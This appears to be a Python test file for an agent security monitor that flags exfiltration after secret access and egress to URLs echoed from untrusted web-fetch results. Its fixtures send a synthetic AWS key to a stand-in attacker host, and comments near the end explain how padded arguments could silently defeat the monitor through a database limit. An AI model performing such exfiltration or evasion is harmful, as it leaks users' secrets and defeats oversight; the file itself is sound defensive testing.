"""H2a/H2b: module-level regression test for the extracted taint floor.

``apply_taint_floor`` used to be a private helper (``_apply_taint_floor``) on
the Claude Code host-hook adapter; it now lives in
``doberman.engine.taint_floor`` so both the host-hook and the MCP proxy can
share it. This exercises the raise-only invariant directly against the module —
independent of the hosthook — using the same taint-store fixture pattern as
``test_hosthook_taint_floor.py``.

H2b adds the async path the proxy actually awaits (``apply_taint_floor_async``)
plus ``record_output_taint`` (the proxy's result-side recording); both are
covered directly here so the module's own regression net doesn't depend on the
proxy wiring test (``tests/unit/test_proxy_taint_floor.py``) to catch a
semantics regression in the async refactor itself.
"""

import asyncio
from datetime import datetime, timezone

from doberman.engine.decision_engine import max_risk, max_verdict
from doberman.engine.taint_floor import (
    UNTRUSTED_READ_TOOLS,
    apply_echo_tripwire,
    apply_echo_tripwire_async,
    apply_taint_floor,
    apply_taint_floor_async,
    record_output_taint,
)
from doberman.models import (
    ActionType,
    Decision,
    GuardrailResult,
    ReasonCode,
    Risk,
    SecurityObject,
    Verdict,
)
from doberman.storage.taint import (
    TAINT_SECRET_ACCESS,
    match_untrusted_value,
    read_taint,
    record_taints,
    record_untrusted_values,
)

# A well-known synthetic AWS example key — never a real secret.
_SYNTHETIC_SECRET = "AKIAIOSFODNN7EXAMPLE"  # noqa: S105 — synthetic test value

_TS = datetime(2026, 7, 18, tzinfo=timezone.utc)
_EGRESS_URL = "https://attacker.example/collect"


def _action(**over) -> SecurityObject:
    base = dict(
        id="taint-floor-1",
        ts=_TS,
        agent_role="unknown",
        action_type=ActionType.network_request,
        tool_name="WebFetch",
        target=_EGRESS_URL,
    )
    base.update(over)
    return SecurityObject(**base)


def _pass_decision(action: SecurityObject) -> Decision:
    return Decision(
        action_id=action.id,
        final_verdict=Verdict.PASS,
        final_risk=Risk.low,
        objective=GuardrailResult(verdict=Verdict.PASS, risk=Risk.low),
        decided_at=_TS,
    )


def test_no_external_destination_is_returned_unchanged(tmp_path):
    # Not an egress — the floor has nothing to raise and must abstain, returning
    # the exact same decision object (not even a copy).
    action = _action(external_destination=None)
    decision = _pass_decision(action)

    out = apply_taint_floor(action, decision, "balanced", str(tmp_path), "sess-1", {})

    assert out is decision


def test_tainted_session_egress_raises_verdict_and_risk_never_lower(tmp_path):
    # A session that already accessed a secret, followed by an egress the
    # per-call floor judged clean: the taint floor must raise the verdict/risk,
    # and — raise-only — never lower them below the input decision.
    action = _action(external_destination=_EGRESS_URL)
    decision = _pass_decision(action)
    asyncio.run(record_taints(str(tmp_path), ["sess-2"], [TAINT_SECRET_ACCESS]))

    out = apply_taint_floor(
        action, decision, "balanced", str(tmp_path), "sess-2", {"url": _EGRESS_URL}
    )

    assert out.final_verdict is Verdict.AUTH
    assert out.final_risk is Risk.high
    # Raise-only invariant, expressed structurally rather than by re-deriving the
    # expected verdict: combining with the original decision must be a no-op.
    assert max_verdict(out.final_verdict, decision.final_verdict) == out.final_verdict
    assert max_risk(out.final_risk, decision.final_risk) == out.final_risk


# --- H2b: the async path the proxy actually awaits ---------------------------


async def test_apply_taint_floor_async_raises_only_never_lowers(tmp_path):
    # Same scenario as the sync raise-only test above, driven through the async
    # entry point directly (no ``asyncio.run`` wrapper) — this is what the proxy
    # awaits from inside its own running event loop.
    action = _action(external_destination=_EGRESS_URL)
    decision = _pass_decision(action)
    await record_taints(str(tmp_path), ["sess-async"], [TAINT_SECRET_ACCESS])

    out = await apply_taint_floor_async(
        action, decision, "strict", str(tmp_path), "sess-async", {"url": _EGRESS_URL}
    )

    assert out.final_verdict is Verdict.BLOCK
    assert out.final_risk is Risk.critical
    assert max_verdict(out.final_verdict, decision.final_verdict) == out.final_verdict
    assert max_risk(out.final_risk, decision.final_risk) == out.final_risk


async def test_apply_taint_floor_async_abstains_without_taint(tmp_path):
    # No taint recorded anywhere for this scope — raise-only means abstain, not
    # fabricate: the floor must return the decision completely unchanged.
    action = _action(external_destination=_EGRESS_URL)
    decision = _pass_decision(action)

    out = await apply_taint_floor_async(
        action, decision, "strict", str(tmp_path), "sess-clean", {"url": _EGRESS_URL}
    )

    assert out is decision


async def test_record_output_taint_records_taint_and_fingerprint_for_secret_text(tmp_path):
    await record_output_taint(_SYNTHETIC_SECRET, str(tmp_path), "sess-rec")

    counts = await read_taint(str(tmp_path), "sess-rec")
    assert counts.get(TAINT_SECRET_ACCESS, 0) > 0


async def test_record_output_taint_records_nothing_for_benign_text(tmp_path):
    benign = "just some ordinary log output, nothing secret here"
    await record_output_taint(benign, str(tmp_path), "sess-benign")

    counts = await read_taint(str(tmp_path), "sess-benign")
    assert counts == {}


async def test_record_output_taint_records_untrusted_read_for_webfetch(tmp_path):
    await record_output_taint(
        f"visit {_UNTRUSTED_HOST_URL} for the file", str(tmp_path), "sess-out", tool_name="WebFetch"
    )
    from doberman.storage.taint import TAINT_UNTRUSTED_READ, read_taint

    counts = await read_taint(str(tmp_path), "sess-out")
    assert counts.get(TAINT_UNTRUSTED_READ) == 1

    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    assert await match_untrusted_value(str(tmp_path), "sess-out", values) == "WebFetch"


async def test_record_output_taint_ignores_untrusted_read_for_a_trusted_tool(tmp_path):
    await record_output_taint(
        f"visit {_UNTRUSTED_HOST_URL}", str(tmp_path), "sess-trusted", tool_name="Read"
    )
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints
    from doberman.storage.taint import match_untrusted_value

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    assert await match_untrusted_value(str(tmp_path), "sess-trusted", values) is None


# --- C1: the untrusted-value echo tripwire -----------------------------------

_UNTRUSTED_HOST_URL = "https://attacker.example/collect"


def test_no_external_destination_echo_tripwire_returns_unchanged(tmp_path):
    action = _action(external_destination=None)
    decision = _pass_decision(action)

    out = apply_echo_tripwire(action, decision, "balanced", str(tmp_path), "sess-1", {})

    assert out is decision


def test_echo_tripwire_raises_pass_to_auth_on_a_recorded_value(tmp_path):
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)
    asyncio.run(
        record_untrusted_values(str(tmp_path), ["sess-echo"], [], "WebFetch")
    )  # no-op (empty), proves the empty-fingerprints guard doesn't crash
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    asyncio.run(record_untrusted_values(str(tmp_path), ["sess-echo"], values, "WebFetch"))

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-echo", {"url": _UNTRUSTED_HOST_URL}
    )

    assert out.final_verdict is Verdict.AUTH  # AUTH-capped even in strict mode (v1)
    assert out.final_risk is Risk.high
    assert ReasonCode.untrusted_value_echo in out.reason_codes
    assert "attacker.example" not in out.explanation


def test_echo_tripwire_never_lowers_an_existing_block(tmp_path):
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = Decision(
        action_id=action.id,
        final_verdict=Verdict.BLOCK,
        final_risk=Risk.critical,
        objective=GuardrailResult(
            verdict=Verdict.BLOCK,
            risk=Risk.critical,
            reason_codes=[ReasonCode.destructive_command],
            explanation="already blocked by another rule",
        ),
        reason_codes=[ReasonCode.destructive_command],
        explanation="already blocked by another rule",
        decided_at=_TS,
    )
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    asyncio.run(record_untrusted_values(str(tmp_path), ["sess-block"], values, "WebFetch"))

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-block", {"url": _UNTRUSTED_HOST_URL}
    )

    assert out is decision  # already BLOCK — the floor skips the read entirely


async def test_apply_echo_tripwire_async_matches_the_sync_wrapper(tmp_path):
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    await record_untrusted_values(str(tmp_path), ["sess-async"], values, "WebSearch")

    out = await apply_echo_tripwire_async(
        action, decision, "balanced", str(tmp_path), "sess-async", {"url": _UNTRUSTED_HOST_URL}
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes


async def test_apply_echo_tripwire_async_abstains_without_a_recorded_value(tmp_path):
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)

    out = await apply_echo_tripwire_async(
        action, decision, "strict", str(tmp_path), "sess-clean", {"url": _UNTRUSTED_HOST_URL}
    )

    assert out is decision


async def test_apply_echo_tripwire_async_storage_failure_leaves_decision_untouched(
    tmp_path, monkeypatch
):
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)

    async def _boom(*_args, **_kwargs):
        raise RuntimeError("taint store unavailable")

    import doberman.storage.taint as taint_module

    monkeypatch.setattr(taint_module, "match_untrusted_value", _boom)

    out = await apply_echo_tripwire_async(
        action, decision, "strict", str(tmp_path), "sess-fail", {"url": _UNTRUSTED_HOST_URL}
    )

    assert out is decision


def test_untrusted_read_tools_constant_matches_the_expected_set():
    assert UNTRUSTED_READ_TOOLS == frozenset({"WebFetch", "WebSearch"})


# --- C1 reviewer follow-up: exclude trusted/task-named hosts from the raise ---
# A WebFetch result merely MENTIONING a trusted host (github.com, pypi.org) or a
# host the user named in their own turn must never turn a later, ordinary
# `git push origin` / `pip install` into an AUTH — that would be a fatigue bomb
# on the most common flows. See doberman.engine.rules.destinations.TRUSTED_HOSTS
# (the same allowlist ExternalDestinationRule uses) and
# doberman.storage.task_match (the user-named-host ledger).


def test_echo_tripwire_excludes_a_trusted_host_end_to_end(tmp_path):
    # (1) An untrusted result mentioning github.com (on TRUSTED_HOSTS), then an
    # outbound call to github.com — must NOT raise.
    asyncio.run(
        record_output_taint(
            "see https://github.com/doberman/docs for details",
            str(tmp_path),
            "sess-trusted-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination="github.com")
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-trusted-echo", {"url": "github.com"}
    )

    assert out is decision


def test_echo_tripwire_excludes_a_trusted_host_at_record_time_too(tmp_path):
    # The record leg must ALSO drop the trusted HOST-level fingerprint — never
    # store the bare "github.com" fingerprint in the first place (row-cap
    # hygiene; C1's "symmetrically at RECORD and CHECK time" instruction). The
    # exclusion is host-value-shaped (matching the brief's exact formula), so
    # this checks the bare-host fingerprint specifically — the same shape a
    # `git push origin`-style bare-host destination produces.
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    asyncio.run(
        record_output_taint(
            "see https://github.com/doberman/docs for details",
            str(tmp_path),
            "sess-trusted-record",
            tool_name="WebFetch",
        )
    )

    host_fp = list(untrusted_value_fingerprints("github.com"))
    assert asyncio.run(match_untrusted_value(str(tmp_path), "sess-trusted-record", host_fp)) is None


def test_echo_tripwire_excludes_a_trusted_host_whole_url_form_end_to_end(tmp_path):
    # Reviewer finding: untrusted_value_fingerprints emits BOTH the bare host
    # AND the whole scheme://host/path form for a URL match. The old
    # fingerprint-subtraction exclusion only ever removed the bare-host
    # fingerprint (a fingerprint of "github.com" cannot be subtracted from the
    # fingerprint of "https://github.com/octocat" — the two hash to unrelated
    # values) — so a WebFetch result mentioning a trusted host's FULL URL,
    # followed by an egress to that EXACT URL, still raised
    # untrusted_value_echo even though the host is trusted. The fix filters by
    # HOST before fingerprinting, so both forms are dropped together.
    asyncio.run(
        record_output_taint(
            "see https://github.com/octocat for the profile",
            str(tmp_path),
            "sess-trusted-url-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination="https://github.com/octocat")
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action,
        decision,
        "strict",
        str(tmp_path),
        "sess-trusted-url-echo",
        {"url": "https://github.com/octocat"},
    )

    assert out is decision


def test_echo_tripwire_excludes_a_trusted_host_whole_url_form_at_record_time_too(tmp_path):
    # The record leg must ALSO drop the whole-URL fingerprint for a trusted
    # host — not just the bare-host one — for the same row-cap-hygiene reason
    # as the bare-host record-time test above.
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    asyncio.run(
        record_output_taint(
            "see https://github.com/octocat for the profile",
            str(tmp_path),
            "sess-trusted-url-record",
            tool_name="WebFetch",
        )
    )

    url_fp = list(untrusted_value_fingerprints("https://github.com/octocat"))
    assert (
        asyncio.run(match_untrusted_value(str(tmp_path), "sess-trusted-url-record", url_fp)) is None
    )


def test_echo_tripwire_still_raises_a_whole_url_echo_for_a_non_excluded_host(tmp_path):
    # Regression guard: the host-based pre-filter must not over-exclude — a
    # genuine attacker host's whole-URL echo still raises exactly as before.
    evil_url = "https://evil.test/x"
    asyncio.run(
        record_output_taint(
            f"see {evil_url} for the payload",
            str(tmp_path),
            "sess-evil-url-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination=evil_url)
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-evil-url-echo", {"url": evil_url}
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes


def test_echo_tripwire_excludes_a_task_named_host(tmp_path):
    # (2) Same, but for a host the user named in their own turn this session
    # (seeded via storage.task_match) rather than the static trusted allowlist.
    from doberman.storage.task_match import record_task_hosts

    asyncio.run(record_task_hosts(str(tmp_path), "sess-task-echo", ["internal.example.net"]))
    asyncio.run(
        record_output_taint(
            "the doc lives at https://internal.example.net/wiki",
            str(tmp_path),
            "sess-task-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination="internal.example.net")
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action,
        decision,
        "strict",
        str(tmp_path),
        "sess-task-echo",
        {"url": "internal.example.net"},
    )

    assert out is decision


def test_echo_tripwire_still_raises_for_a_non_excluded_host(tmp_path):
    # (3) Regression guard: a task-named host in the SAME session must not
    # blanket-exclude a genuine attacker host that was also echoed.
    from doberman.storage.task_match import record_task_hosts

    asyncio.run(record_task_hosts(str(tmp_path), "sess-mixed-echo", ["internal.example.net"]))
    asyncio.run(
        record_output_taint(
            f"compare internal.example.net against {_UNTRUSTED_HOST_URL} for the payload",
            str(tmp_path),
            "sess-mixed-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action,
        decision,
        "strict",
        str(tmp_path),
        "sess-mixed-echo",
        {"url": _UNTRUSTED_HOST_URL},
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes


def test_echo_tripwire_fires_even_if_the_trusted_allowlist_is_unreadable(tmp_path, monkeypatch):
    # (4) A broken exclusion lookup must fail closed to "exclude nothing" — the
    # floor stays strict, never crashes, and never suppresses a real attacker
    # echo just because the allowlist/task store couldn't be read.
    import doberman.engine.rules.destinations as destinations_module

    class _Unreadable:
        def __iter__(self):
            raise RuntimeError("allowlist unreadable")

    monkeypatch.setattr(destinations_module, "TRUSTED_HOSTS", _Unreadable())

    asyncio.run(
        record_output_taint(
            f"visit {_UNTRUSTED_HOST_URL}",
            str(tmp_path),
            "sess-allowlist-fail",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action,
        decision,
        "strict",
        str(tmp_path),
        "sess-allowlist-fail",
        {"url": _UNTRUSTED_HOST_URL},
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes


# --- final review, CRITICAL: an aggregate fingerprint cap so padded args -----
# cannot defeat a match query by blowing SQLite's `IN (...)` variable limit.
# Both padded-args tests monkeypatch the fingerprint key loader with an
# lru_cache purely for TEST SPEED (production is unaffected — same
# deterministic key either way): without it, tens of thousands of real
# fingerprint() calls each re-read the local key file from disk (a pre-
# existing, unrelated cost — see fingerprint.py's _load_or_create_key).


def _cache_fingerprint_key(monkeypatch) -> None:
    from functools import lru_cache

    import doberman.storage.fingerprint as fingerprint_module

    monkeypatch.setattr(
        fingerprint_module,
        "_load_or_create_key",
        lru_cache(maxsize=1)(fingerprint_module._load_or_create_key),
    )


def test_padded_args_cannot_defeat_the_echo_tripwire_via_sqlite_variable_limit(
    tmp_path, monkeypatch
):
    # A per-string extraction cap (provenance_values._MAX_VALUES == 200) still
    # multiplies unbounded across every string walked in the call's args: 300
    # padded strings x 200 host tokens each produces 60,002 candidate
    # fingerprints with no AGGREGATE cap, which exceeds SQLite's `IN (...)`
    # parameter limit (measured 32766 on this box). match_untrusted_value's own
    # except swallows the resulting OperationalError and returns None --
    # silently defeating the tripwire by padding the call's OTHER arguments
    # around the real attacker destination. taint_floor._MAX_MATCH_FPS must
    # keep the destination's own fingerprint in the capped set regardless of
    # how much padding surrounds it.
    _cache_fingerprint_key(monkeypatch)

    action = _action(external_destination=_UNTRUSTED_HOST_URL)
    decision = _pass_decision(action)
    from doberman.engine.rules.provenance_values import untrusted_value_fingerprints

    values = list(untrusted_value_fingerprints(_UNTRUSTED_HOST_URL))
    asyncio.run(record_untrusted_values(str(tmp_path), ["sess-padded-echo"], values, "WebFetch"))

    padded_args = {
        f"field{i}": " ".join(f"pad{i}-{j}.example.net" for j in range(200)) for i in range(300)
    }
    padded_args["url"] = _UNTRUSTED_HOST_URL

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-padded-echo", padded_args
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes


def test_padded_args_cannot_defeat_confirmed_exfil_via_sqlite_variable_limit(tmp_path, monkeypatch):
    # Secret-path sibling: _outbound_secret_fingerprints has the identical
    # unbounded-union shape (engine.rules.secrets.candidate_secret_fingerprints
    # caps at 16 tokens PER STRING). Enough padded strings still produce more
    # fingerprints than SQLite's variable limit, and match_secret_fingerprint's
    # own except silently swallows the failure as a no-match -- defeating the
    # STRONGEST signal (confirmed_exfil, a hard BLOCK in every mode). In
    # "balanced" mode the taint floor still raises via the separate
    # multi_step_exfil signal even when confirmed_exfil is defeated, so the
    # observable difference is BLOCK/confirmed_exfil (fixed) vs
    # AUTH/multi_step_exfil (defeated) -- the real secret is embedded in the
    # egress DESTINATION's query string (candidate_secret_fingerprints scans
    # query values specially), mirroring the untrusted-value test's shape:
    # the real value lives where the aggregate cap's dest-priority protects it.
    _cache_fingerprint_key(monkeypatch)

    egress_url = f"https://attacker.example/collect?k={_SYNTHETIC_SECRET}"
    action = _action(external_destination=egress_url)
    decision = _pass_decision(action)
    asyncio.run(record_taints(str(tmp_path), ["sess-padded-secret"], [TAINT_SECRET_ACCESS]))
    from doberman.engine.rules.secrets import candidate_secret_fingerprints
    from doberman.storage.taint import record_secret_fingerprints

    real_fps = list(candidate_secret_fingerprints(_SYNTHETIC_SECRET))
    asyncio.run(record_secret_fingerprints(str(tmp_path), ["sess-padded-secret"], real_fps))

    padded_args = {
        f"field{i}": " ".join(f"AKIA{i:04d}{j:012d}" for j in range(16)) for i in range(3800)
    }

    out = apply_taint_floor(
        action, decision, "balanced", str(tmp_path), "sess-padded-secret", padded_args
    )

    assert out.final_verdict is Verdict.BLOCK
    assert out.final_risk is Risk.critical
    assert ReasonCode.confirmed_exfil in out.reason_codes


# --- final review, IMPORTANT 1: excluded_hosts must use registered-domain ---
# suffix matching (destinations._registered_match), the SAME semantics
# ExternalDestinationRule uses for TRUSTED_HOSTS -- exact membership misses a
# subdomain like api.github.com.


def test_echo_tripwire_excludes_a_subdomain_of_a_trusted_host(tmp_path):
    asyncio.run(
        record_output_taint(
            "see https://api.github.com/repos/x for the issue",
            str(tmp_path),
            "sess-subdomain-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination="api.github.com")
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-subdomain-echo", {"url": "api.github.com"}
    )

    assert out is decision


def test_echo_tripwire_still_raises_for_a_lookalike_domain_not_a_true_subdomain(tmp_path):
    # github.com.evil.test merely CONTAINS "github.com" as a label sequence --
    # it is NOT a subdomain under registered-domain suffix matching (host == d
    # or host.endswith("." + d)) and must still raise. Regression guard
    # against over-broad exclusion.
    evil_url = "https://github.com.evil.test/x"
    asyncio.run(
        record_output_taint(
            f"see {evil_url} for the payload",
            str(tmp_path),
            "sess-lookalike-echo",
            tool_name="WebFetch",
        )
    )
    action = _action(external_destination=evil_url)
    decision = _pass_decision(action)

    out = apply_echo_tripwire(
        action, decision, "strict", str(tmp_path), "sess-lookalike-echo", {"url": evil_url}
    )

    assert out.final_verdict is Verdict.AUTH
    assert ReasonCode.untrusted_value_echo in out.reason_codes
